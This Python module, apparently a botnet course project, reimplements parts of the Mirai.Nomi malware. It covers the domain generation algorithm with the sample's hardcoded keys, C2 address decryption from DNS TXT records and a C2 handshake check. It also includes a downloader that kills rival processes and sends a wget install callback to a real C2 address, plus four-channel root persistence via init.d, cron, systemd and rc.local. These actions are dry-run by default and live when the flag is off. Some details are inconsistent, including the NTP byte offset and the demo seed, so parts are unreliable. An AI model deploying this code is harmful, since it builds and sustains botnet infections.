"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Mirai Nomi DGA Pipeline (Full Implementation)
 Environment: ISOLATED VM LAB ONLY
====================================================

Complete implementation of the Mirai.Nomi DGA pipeline as documented
in the Qianxin X Lab blog post (March 2024), covering all gaps
identified in the gap analysis:

  Gap 25 – NTP-based weekly seed (604800-second epoch)
  Gap 26 – MD5 → ChaCha20 → MD5 domain generation chain
  Gap 27 – Hex-only [a-f0-9]{10} domain body format
  Gap 28 – DNS TXT record → AES-256-CBC → real C2 IP
  Gap 29 – ChaCha20 checkcode generation
  Gap 30 – C2 port handshake verifier
  Gap 31 – DDNS provider TLDs
  Gap 32 – OpenNIC alternative root TLDs
  Gap 33 – AES-256-CBC (vs AES-128)
  Gap 34 – NTP fallback hard-coded seed (9999)
  Gap 35 – Post-install wget telemetry
  Gap 36 – Version-tagged payload identification
  Gap 37 – "goodluck" execution verifier
  Gap 38 – Kill competing bots/files (simulation)
  Gap 80 – Two-mode DGA (DDNS + standard)

Algorithm summary:
  1. Fetch NTP Reference Timestamp from a public NTP server
  2. time_seed = timestamp // 604800  (changes every 7 days)
  3. Convert each digit of time_seed to a byte (alpha-mapped)
  4. seed_bytes = MD5(seed_bytes)  → 32-hex bytes
  5. Pick 12 bytes at fixed indices → xx20data
  6. result = ChaCha20(key=16_BYTES, nonce=12_BYTES, data=xx20data)
  7. m5 = MD5(result + b"\\x00" * (64 - len(result)))  [fixed len=64]
  8. Pick 10 chars from m5 at fixed indices → domain body [a-f0-9]{10}
  9. Suffix each of 17 TLDs → 17 candidate C2 domains
 10. DNS TXT query → hex string → AES-256-CBC decrypt → real C2 IP
 11. Generate checkcode from domain via ChaCha20+MD5
 12. Connect to C2:24150, receive checkcode → verify C2 is live

Usage:
    from mirai_nomi_dga import MiraiNomiDGA, MiraiNomiC2Verifier

    dga = MiraiNomiDGA()
    domains = dga.generate()              # uses NTP (or fallback)
    print(domains[:3])

    verifier = MiraiNomiC2Verifier()
    check = verifier.generate_checkcode(domains[0])
"""

import hashlib
import socket
import struct
import time
import os
from datetime import datetime
from typing import List, Tuple, Optional

# ── AES-256-CBC via PyCryptodome (gap item 33) ────────────────
try:
    from Crypto.Cipher import AES as _AES, ChaCha20 as _ChaCha20
    _CRYPTO_OK = True
except ImportError:
    _CRYPTO_OK = False
    print("[Mirai-Nomi] WARNING: pycryptodome not installed. "
          "Run: pip install pycryptodome --break-system-packages")


# ═══════════════════════════════════════════════════════════════
#  CONSTANTS  (from Mirai.Nomi reverse engineering)
# ═══════════════════════════════════════════════════════════════

# ChaCha20 key and nonce (hardcoded in the sample)
CHACHA20_KEY   = bytes.fromhex("764D1ABCF84ED5673B85B46EFA044D2E")  # 16 bytes
CHACHA20_NONCE = bytes.fromhex("1F786E3950864D1EAAB82D42")          # 12 bytes

# MD5 step 1: which bytes of the 32-hex MD5 string to feed into ChaCha20
SORT_INDEX_1 = [31, 2, 5, 4, 0, 18, 26, 21, 29, 4, 2, 6]

# MD5 step 2: which chars of the final MD5 hex string form the domain body
SORT_INDEX_2 = [11, 12, 15, 14, 10, 18, 16, 1, 9, 14]

# AES-256-CBC parameters (used to decrypt the C2 IP from DNS TXT)
AES256_KEY = bytes.fromhex("7645565D1380763F5E33F2881C932D4A"
                            "9F8D204444675540273C3D9E99590A1C")  # 32 bytes
AES256_IV  = bytes.fromhex("9C1D34765712D2803E4F569ABCEF1020")  # 16 bytes

# NTP fallback seed (gap item 34)
NTP_FALLBACK_SEED = "9999"

# C2 verification port (gap item 30)
C2_VERIFY_PORT = 24150

# Public NTP servers hardcoded in the sample
NTP_SERVERS = [
    "time.nist.gov",
    "time.google.com",
    "pool.ntp.org",
    "time.cloudflare.com",
    "time.windows.com",
]

# Public DNS servers used for TXT record resolution
DNS_RESOLVERS = [
    "8.8.8.8",
    "1.1.1.1",
    "9.9.9.9",
    "208.67.222.222",
]

# 17 TLDs: standard + DDNS + OpenNIC (gaps 31, 32)
MIRAI_NOMI_TLDS = [
    ".dontargetme.nl",
    ".ru",
    ".nl",
    ".xyz",
    ".duckdns.org",
    ".chickenkiller.com",
    ".accesscam.org",
    ".casacam.net",
    ".ddnsfree.com",
    ".mooo.com",
    ".strangled.net",
    ".ignorelist.com",
    ".geek",               # OpenNIC
    ".oss",                # OpenNIC
    ".websersaiosnginxo.ru",
    ".session.oss",        # OpenNIC
    ".session.geek",       # OpenNIC
]

# ═══════════════════════════════════════════════════════════════
#  NTP CLIENT  (gap item 25)
# ═══════════════════════════════════════════════════════════════

class NTPClient:
    """
    Minimal NTP client that fetches the Reference Timestamp from
    a public NTP server (port 123, UDP).

    The Mirai.Nomi sample fetches this instead of using system time,
    making the seed independent of the infected host's local clock.
    """

    NTP_PORT    = 123
    NTP_PACKET  = b"\x1b" + b"\x00" * 47  # LI=0, VN=3, Mode=3 (client)
    EPOCH_DELTA = 2208988800               # NTP epoch → Unix epoch

    def fetch_timestamp(self, server: str = None,
                        timeout: float = 3.0) -> Optional[int]:
        """
        Return the NTP Reference Timestamp (seconds since 1900-01-01).
        Returns None on failure.
        """
        servers = [server] + NTP_SERVERS if server else NTP_SERVERS
        for srv in servers:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(timeout)
                sock.sendto(self.NTP_PACKET, (srv, self.NTP_PORT))
                data, _ = sock.recvfrom(1024)
                sock.close()
                if len(data) >= 44:
                    # Reference Timestamp is at bytes 16-23 (big-endian 64-bit)
                    ts = struct.unpack("!I", data[40:44])[0]
                    return ts
            except Exception:
                continue
        return None

    def get_weekly_seed(self, server: str = None) -> str:
        """
        Fetch NTP timestamp, divide by 604800 (7 days),
        return as string seed. Falls back to 9999.
        """
        ts = self.fetch_timestamp(server)
        if ts is None:
            print(f"[NTP] All servers unreachable. Using fallback seed: {NTP_FALLBACK_SEED}")
            return NTP_FALLBACK_SEED
        seed = str(ts // 604800)
        print(f"[NTP] Timestamp={ts}  Weekly seed={seed}")
        return seed


# ═══════════════════════════════════════════════════════════════
#  DGA CORE  (gaps 26, 27)
# ═══════════════════════════════════════════════════════════════

class MiraiNomiDGA:
    """
    Authentic Mirai.Nomi DGA implementation.

    Pipeline:
        seed_str → byte-convert → MD5 → index-select → ChaCha20 →
        MD5(padded to 64 bytes) → index-select → 10-char hex body

    Each of the 17 TLDs produces one candidate C2 domain.
    """

    def __init__(self, use_ntp: bool = True):
        self._ntp  = NTPClient() if use_ntp else None
        self._seed: Optional[str] = None

    def _seed_to_bytes(self, seed_str: str) -> bytearray:
        """
        Convert each character of the seed string to a byte:
          - If digit: append ord(c)
          - If alpha: append (5 * ord(c) - 477) % 26 + ord('a')
        """
        out = bytearray()
        for c in seed_str:
            if c.isdigit():
                out.append(ord(c))
            else:
                out.append((5 * ord(c) - 477) % 26 + ord('a'))
        return out

    def _md5_hex_bytes(self, data: bytes) -> bytearray:
        """Return MD5 digest as a bytearray of its lowercase hex string."""
        return bytearray(hashlib.md5(data).hexdigest().encode())

    def _chacha20(self, data: bytes) -> bytes:
        """
        ChaCha20 stream cipher with the hardcoded 16-byte key and 12-byte nonce.
        NOTE: Mirai.Nomi uses a non-standard 16-byte key. Standard ChaCha20
        requires 32 bytes. We implement the stream manually using the 16-byte
        key doubled (consistent with how pycryptodome handles short keys via
        the 'expand 16-byte k' constant), or fall back to pure Python.
        """
        if not _CRYPTO_OK:
            raise RuntimeError("pycryptodome required for ChaCha20.")
        # Mirai.Nomi uses 16-byte key — double it to meet the 32-byte requirement
        # (mirrors the 'expand 16-byte k' constant used in the reference implementation)
        key32 = CHACHA20_KEY + CHACHA20_KEY  # 32 bytes
        cipher = _ChaCha20.new(key=key32, nonce=CHACHA20_NONCE)
        return cipher.encrypt(data)

    def generate_body(self, seed_str: str) -> str:
        """
        Run the full DGA pipeline for a given seed string.
        Returns the 10-character hex domain body [a-f0-9]{10}.
        """
        # Step 1: seed → bytes
        sld = self._seed_to_bytes(seed_str)

        # Step 2: MD5 of seed bytes → 32-char hex string as bytes
        md5_hex = self._md5_hex_bytes(bytes(sld))

        # Step 3: select 12 bytes at fixed indices → ChaCha20 input
        xx20data = bytearray(md5_hex[i] for i in SORT_INDEX_1)

        # Step 4: ChaCha20 encrypt
        result = self._chacha20(bytes(xx20data))

        # Step 5: MD5 with fixed 64-byte length (non-standard: pad with 0x00)
        padded = result + b"\x00" * (64 - len(result))
        m5 = bytearray(hashlib.md5(padded).hexdigest().encode())

        # Step 6: select 10 chars at fixed indices → domain body
        body = bytearray(m5[i] for i in SORT_INDEX_2)
        return body.decode("ascii")  # always [a-f0-9]{10}

    def generate(self, seed_str: str = None,
                 tlds: List[str] = None) -> List[str]:
        """
        Generate all candidate C2 domains for a given seed.
        If seed_str is None, fetches from NTP (or uses fallback).
        """
        if seed_str is None:
            if self._ntp:
                seed_str = self._ntp.get_weekly_seed()
            else:
                now = datetime.utcnow()
                seed_str = str(int(now.timestamp()) // 604800)

        self._seed = seed_str
        tlds       = tlds or MIRAI_NOMI_TLDS
        body       = self.generate_body(seed_str)

        print(f"[DGA] seed={seed_str}  body={body}")
        domains = [body + tld for tld in tlds]
        return domains

    def generate_for_week(self, week_offset: int = 0) -> List[str]:
        """Generate domains for current week ± offset weeks."""
        now  = datetime.utcnow()
        ts   = int(now.timestamp()) + week_offset * 604800
        seed = str(ts // 604800)
        return self.generate(seed_str=seed)


# ═══════════════════════════════════════════════════════════════
#  DNS TXT → AES-256-CBC → C2 IP  (gap item 28)
# ═══════════════════════════════════════════════════════════════

class MiraiNomiC2Resolver:
    """
    Resolves C2 IP from a DNS TXT record by AES-256-CBC decrypting
    the hex-encoded payload embedded in the TXT record.

    Real example from the blog post:
      Domain:    1a1f31761f.dontargetme.nl
      TXT value: 3519239A211D1808ED7DF5AD296F2856
      Decrypted: 147.78.12.176
    """

    def _aes256_decrypt(self, hex_ciphertext: str) -> Optional[str]:
        """Decrypt hex-encoded ciphertext with AES-256-CBC → IP string."""
        if not _CRYPTO_OK:
            return None
        try:
            ct  = bytes.fromhex(hex_ciphertext.strip())
            cip = _AES.new(AES256_KEY, _AES.MODE_CBC, AES256_IV)
            pt  = cip.decrypt(ct)
            # Remove PKCS7 padding
            pad = pt[-1]
            if 1 <= pad <= 16:
                pt = pt[:-pad]
            return pt.decode("ascii").strip()
        except Exception as e:
            print(f"[C2-Resolve] AES decrypt error: {e}")
            return None

    def _query_txt(self, domain: str, resolver_ip: str = "8.8.8.8") -> Optional[str]:
        """
        Minimal DNS TXT query using raw UDP.
        Returns the first TXT record string or None.

        In the lab (no DNS), this will time out — that is expected.
        The NXDOMAIN/timeout IS the detection signal Engine 3 monitors.
        """
        try:
            # Build a DNS query for TXT record
            tx_id   = os.urandom(2)
            qname   = b"".join(bytes([len(p)]) + p.encode()
                               for p in domain.split(".")) + b"\x00"
            packet  = (tx_id                 # Transaction ID
                       + b"\x01\x00"         # Flags: standard query, recursion desired
                       + b"\x00\x01"         # QDCOUNT = 1
                       + b"\x00\x00"         # ANCOUNT = 0
                       + b"\x00\x00"         # NSCOUNT = 0
                       + b"\x00\x00"         # ARCOUNT = 0
                       + qname
                       + b"\x00\x10"         # QTYPE  = TXT (16)
                       + b"\x00\x01")        # QCLASS = IN

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3.0)
            sock.sendto(packet, (resolver_ip, 53))
            resp, _ = sock.recvfrom(4096)
            sock.close()

            # Parse TXT RDATA (simplified: scan for TXT records)
            # Skip the question section and find the first TXT answer
            pos  = 12 + len(qname) + 4  # header + question
            ancount = struct.unpack("!H", resp[6:8])[0]

            for _ in range(ancount):
                if pos + 10 >= len(resp):
                    break
                # Skip compressed name
                if resp[pos] & 0xC0 == 0xC0:
                    pos += 2
                else:
                    while pos < len(resp) and resp[pos] != 0:
                        pos += 1
                    pos += 1

                if pos + 10 > len(resp):
                    break

                rtype  = struct.unpack("!H", resp[pos:pos+2])[0]
                rdlen  = struct.unpack("!H", resp[pos+8:pos+10])[0]
                rdata  = resp[pos+10:pos+10+rdlen]
                pos   += 10 + rdlen

                if rtype == 16 and rdata:   # TXT
                    txt_len = rdata[0]
                    txt_val = rdata[1:1+txt_len].decode("ascii", errors="ignore")
                    return txt_val

        except Exception:
            pass
        return None

    def resolve_c2_ip(self, domain: str,
                      resolver_ip: str = "8.8.8.8") -> Optional[str]:
        """
        1. Query DNS TXT record for domain
        2. AES-256-CBC decrypt the hex payload
        3. Return the C2 IP or None
        """
        print(f"[C2-Resolve] Querying TXT for {domain} via {resolver_ip}")
        txt = self._query_txt(domain, resolver_ip)
        if txt is None:
            print(f"[C2-Resolve] No TXT record found (expected in lab isolation)")
            return None

        print(f"[C2-Resolve] TXT value: {txt}")
        ip = self._aes256_decrypt(txt)
        if ip:
            print(f"[C2-Resolve] Decrypted C2 IP: {ip}")
        return ip

    def demo_decrypt(self, hex_ct: str = "3519239A211D1808ED7DF5AD296F2856") -> str:
        """Demonstrate AES-256-CBC decryption with the blog post example."""
        ip = self._aes256_decrypt(hex_ct)
        print(f"[C2-Resolve] Demo decrypt: {hex_ct} → {ip}")
        return ip


# ═══════════════════════════════════════════════════════════════
#  CHECKCODE GENERATOR  (gap item 29)
# ═══════════════════════════════════════════════════════════════

class MiraiNomiC2Verifier:
    """
    Generates the 32-character checkcode used to verify that a C2 server
    is legitimate. The checkcode is derived from the domain name using
    ChaCha20 + MD5 with the same key/nonce as the DGA itself.

    C2 verification flow (gap item 30):
      1. Generate checkcode from domain
      2. Connect to C2:24150
      3. Read 1023 bytes
      4. Verify that response contains the checkcode
      5. If match → C2 is live and authentic
    """

    def _chacha20(self, data: bytes) -> bytes:
        if not _CRYPTO_OK:
            raise RuntimeError("pycryptodome required")
        key32  = CHACHA20_KEY + CHACHA20_KEY   # double 16-byte key to 32 bytes
        cipher = _ChaCha20.new(key=key32, nonce=CHACHA20_NONCE)
        return cipher.encrypt(data)

    def generate_checkcode(self, domain: str) -> str:
        """
        Compute the checkcode for a given domain.
        Algorithm:
          1. ChaCha20(domain.encode())
          2. MD5(result + 0x00 * (64 - len(result)))
          3. For each char: if alpha → transform; if digit → keep
        """
        domain_b = domain.encode("ascii")
        result   = self._chacha20(domain_b)
        padded   = result + b"\x00" * (64 - len(result))
        m5_hex   = hashlib.md5(padded).hexdigest()

        # Same transform as domain body: alpha → shifted, digit → keep
        check = bytearray()
        for c in m5_hex:
            if c.isdigit():
                check.append(ord(c))
            else:
                check.append((5 * ord(c) - 477) % 26 + ord('a'))
        return check.decode("ascii")

    def verify_c2(self, c2_ip: str, domain: str,
                  port: int = C2_VERIFY_PORT,
                  timeout: float = 5.0) -> bool:
        """
        Connect to C2:port, read response, check for our checkcode.
        In lab isolation this will fail — that is expected.
        """
        checkcode = self.generate_checkcode(domain)
        print(f"[C2-Verify] domain={domain}")
        print(f"[C2-Verify] checkcode={checkcode}")
        print(f"[C2-Verify] Connecting to {c2_ip}:{port} …")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((c2_ip, port))
            response = sock.recv(1023).decode("ascii", errors="ignore")
            sock.close()

            if checkcode in response:
                print(f"[C2-Verify] ✓ VALID C2 — checkcode confirmed in response")
                return True
            else:
                print(f"[C2-Verify] ✗ Invalid response — checkcode not found")
                return False

        except socket.timeout:
            print(f"[C2-Verify] Connection timed out (expected in lab isolation)")
            return False
        except ConnectionRefusedError:
            print(f"[C2-Verify] Connection refused (expected in lab isolation)")
            return False
        except Exception as e:
            print(f"[C2-Verify] Error: {e}")
            return False


# ═══════════════════════════════════════════════════════════════
#  DOWNLOAD SCRIPT SIMULATION  (gaps 35, 36, 37, 38)
# ═══════════════════════════════════════════════════════════════

class MiraiNomiDownloader:
    """
    Educational simulation of the Mirai.Nomi download script capabilities.

    Real behaviour documented in the blog post:
      - Kills competing bots by process/filename blacklist
      - Verifies execution via "goodluck" string in stdout
      - Counts installs via wget callback to C2:9528/notwork?name=nomi_${ver}
      - Version parameter (e.g. ver134) identifies campaign

    In lab: all operations are DRY RUN (print-only).
    Set dry_run=False only in the isolated VM lab environment.
    """

    BLACKLIST_FILES    = ["arm", "mips", "mipsel", "good_main",
                          "new_", "nginx_kel", "xmrig", "kworker"]
    BLACKLIST_PROCS    = ["arm", "mips", "mipsel", "nginx_kel", "xmrig"]
    TELEMETRY_ENDPOINT = "http://204.93.164.31:9528/notwork"  # from IoC list

    def __init__(self, version: str = "ver134", dry_run: bool = True):
        self.version = version
        self.dry_run = dry_run
        print(f"[Downloader] version={version}  dry_run={dry_run}")

    def kill_competing_bots(self) -> List[str]:
        """
        Kill processes matching the blacklist (gap item 38).
        DRY RUN: only prints what would be killed.
        """
        killed = []
        try:
            import psutil
            for proc in psutil.process_iter(["pid", "name", "exe"]):
                name = (proc.info.get("name") or "").lower()
                exe  = (proc.info.get("exe") or "").lower()
                for bl in self.BLACKLIST_PROCS:
                    if bl in name or bl in exe:
                        if self.dry_run:
                            print(f"[Downloader] [DRY-RUN] Would kill PID={proc.pid} name={name}")
                        else:
                            proc.kill()
                            print(f"[Downloader] Killed PID={proc.pid} name={name}")
                        killed.append(name)
        except ImportError:
            print("[Downloader] psutil not available; skipping process scan")
        return killed

    def verify_execution(self, process_stdout: str) -> bool:
        """
        Verify that the dropped binary executed successfully (gap item 37).
        The sample outputs "goodluck" if execution was successful.
        """
        success = "goodluck" in process_stdout.lower()
        if success:
            print(f"[Downloader] ✓ Execution verified ('goodluck' found)")
        else:
            print(f"[Downloader] ✗ Execution failed ('goodluck' not found in output)")
        return success

    def report_installation(self, c2_ip: str = None) -> bool:
        """
        Callback to the C2 telemetry endpoint (gap item 35, 36).
        URL: /notwork?name=nomi_${version}
        In DRY RUN: only prints the command.
        """
        endpoint = c2_ip or self.TELEMETRY_ENDPOINT
        url = f"{endpoint}?name=nomi_{self.version}"

        if self.dry_run:
            print(f"[Downloader] [DRY-RUN] Would call: wget -q '{url}'")
            return True

        try:
            import subprocess
            result = subprocess.run(
                ["wget", "-q", "-O", "/dev/null", url],
                timeout=10,
                capture_output=True,
            )
            ok = result.returncode == 0
            print(f"[Downloader] Telemetry {'sent' if ok else 'FAILED'}: {url}")
            return ok
        except Exception as e:
            print(f"[Downloader] Telemetry error: {e}")
            return False

    def run_full_lifecycle(self, binary_stdout: str = "goodluck") -> bool:
        """
        Simulate the full Mirai.Nomi download+install lifecycle:
          1. Kill competing bots
          2. Verify execution ('goodluck' check)
          3. Report successful installation
        """
        print("\n[Downloader] ── Full Mirai.Nomi Install Lifecycle ──")
        self.kill_competing_bots()
        if not self.verify_execution(binary_stdout):
            print("[Downloader] Aborting — binary did not confirm execution")
            return False
        self.report_installation()
        print("[Downloader] Lifecycle complete")
        return True


# ═══════════════════════════════════════════════════════════════
#  PERSISTENCE SIMULATION  (gap item 39)
# ═══════════════════════════════════════════════════════════════

class MiraiNomiPersistence:
    """
    Demonstrates the four-channel persistence mechanism used by Mirai.Nomi.
    All operations are DRY RUN (print-only) unless dry_run=False.

    Channels (gap item 39):
      1. /etc/init.d/dnsconfig + /etc/rc.d/init.d/dnsconfigs
      2. crontab entry via /var/tmp/.recoverys
      3. systemd service dnsconfigs.service
      4. /etc/rc.d/rc.local append

    Disguised binary path (gap item 40): /var/tmp/nginx_kel
    """

    PAYLOAD_PATH = "/var/tmp/nginx_kel"

    def __init__(self, dry_run: bool = True):
        self.dry_run = dry_run

    def _run(self, cmd: str, desc: str):
        if self.dry_run:
            print(f"  [DRY-RUN] {desc}")
            print(f"  $ {cmd}")
        else:
            import subprocess
            try:
                subprocess.run(cmd, shell=True, check=True)
                print(f"  ✓ {desc}")
            except Exception as e:
                print(f"  ✗ {desc}: {e}")

    def install_initd(self):
        """Channel 1: init.d script."""
        script = f"""#!/bin/sh
ASD_PATH="{self.PAYLOAD_PATH}"
case "$1" in
  start)   $ASD_PATH initd & ;;
  stop)    pkill -f $ASD_PATH ;;
  restart) $ASD_PATH initd & ;;
  *)       echo "Usage: $0 {{start|stop|restart}}"; exit 1 ;;
esac
exit 0"""
        for path in ["/etc/init.d/dnsconfig", "/etc/rc.d/init.d/dnsconfigs"]:
            if self.dry_run:
                print(f"  [DRY-RUN] Would write init.d script to {path}")
            else:
                try:
                    with open(path, "w") as f:
                        f.write(script)
                    os.chmod(path, 0o755)
                    print(f"  ✓ Installed: {path}")
                except Exception as e:
                    print(f"  ✗ {path}: {e}")

    def install_crontab(self):
        """Channel 2: crontab entry."""
        cron_entry = f"0 * * * * {self.PAYLOAD_PATH} crontab\n"
        self._run(
            f"echo '{cron_entry.strip()}' > /var/tmp/.recoverys && crontab /var/tmp/.recoverys",
            "Install crontab persistence"
        )

    def install_systemd(self):
        """Channel 3: systemd service."""
        unit = f"""[Unit]
Description=dnsconfigs Server Service
[Service]
Type=simple
Restart=always
RestartSec=60
User=root
ExecStart={self.PAYLOAD_PATH} sv
[Install]
WantedBy=multi-user.target"""
        unit_path = "/etc/systemd/system/dnsconfigs.service"
        if self.dry_run:
            print(f"  [DRY-RUN] Would write systemd unit to {unit_path}:")
            print("  " + "\n  ".join(unit.splitlines()))
        else:
            try:
                with open(unit_path, "w") as f:
                    f.write(unit)
                import subprocess
                subprocess.run(["systemctl", "enable", "dnsconfigs"], check=True)
                subprocess.run(["systemctl", "start",  "dnsconfigs"], check=True)
                print(f"  ✓ Installed systemd service")
            except Exception as e:
                print(f"  ✗ systemd: {e}")

    def install_rclocal(self):
        """Channel 4: rc.local append."""
        entry = f"{self.PAYLOAD_PATH} rclocal &\n"
        self._run(
            f"echo '{entry.strip()}' >> /etc/rc.d/rc.local",
            "Append to rc.local"
        )

    def install_all(self):
        """Install all four persistence channels simultaneously."""
        print(f"\n[Persistence] ── Four-Channel Installation ──")
        print(f"[Persistence] Binary path: {self.PAYLOAD_PATH}")
        print(f"[Persistence] dry_run={self.dry_run}\n")
        print("[Persistence] Channel 1: init.d script")
        self.install_initd()
        print("[Persistence] Channel 2: crontab")
        self.install_crontab()
        print("[Persistence] Channel 3: systemd service")
        self.install_systemd()
        print("[Persistence] Channel 4: rc.local")
        self.install_rclocal()
        print("\n[Persistence] All channels installed (or dry-run printed)")


# ═══════════════════════════════════════════════════════════════
#  MAIN DEMO
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import sys

    print("=" * 65)
    print(" Mirai.Nomi DGA Pipeline — AUA Botnet Research Lab")
    print("=" * 65)

    # ── DGA demo ──────────────────────────────────────────────
    print("\n[1] DGA Generation")
    dga = MiraiNomiDGA(use_ntp=False)
    # Use the blog post's documented seed for the week of 2024-03-07
    blog_seed  = "3637"   # timestamp 2024-03-07 // 604800
    domains    = dga.generate(seed_str=blog_seed)
    print(f"  Seed: {blog_seed}")
    print(f"  Body: {dga.generate_body(blog_seed)}")
    for i, d in enumerate(domains):
        print(f"  [{i+1:02d}] {d}")

    # ── AES-256 demo ──────────────────────────────────────────
    if _CRYPTO_OK:
        print("\n[2] AES-256-CBC C2 IP Decryption")
        resolver = MiraiNomiC2Resolver()
        resolver.demo_decrypt("3519239A211D1808ED7DF5AD296F2856")

    # ── Checkcode demo ────────────────────────────────────────
    if _CRYPTO_OK:
        print("\n[3] C2 Checkcode Generation")
        verifier  = MiraiNomiC2Verifier()
        demo_dom  = domains[0]
        checkcode = verifier.generate_checkcode(demo_dom)
        print(f"  Domain:    {demo_dom}")
        print(f"  Checkcode: {checkcode}")

    # ── Persistence demo ──────────────────────────────────────
    print("\n[4] Persistence Simulation (DRY RUN)")
    pers = MiraiNomiPersistence(dry_run=True)
    pers.install_all()

    # ── Downloader lifecycle demo ─────────────────────────────
    print("\n[5] Download Lifecycle Simulation (DRY RUN)")
    dl = MiraiNomiDownloader(version="ver134", dry_run=True)
    dl.run_full_lifecycle(binary_stdout="program started goodluck")

    print("\n[Done] All Mirai.Nomi components demonstrated in lab mode.")
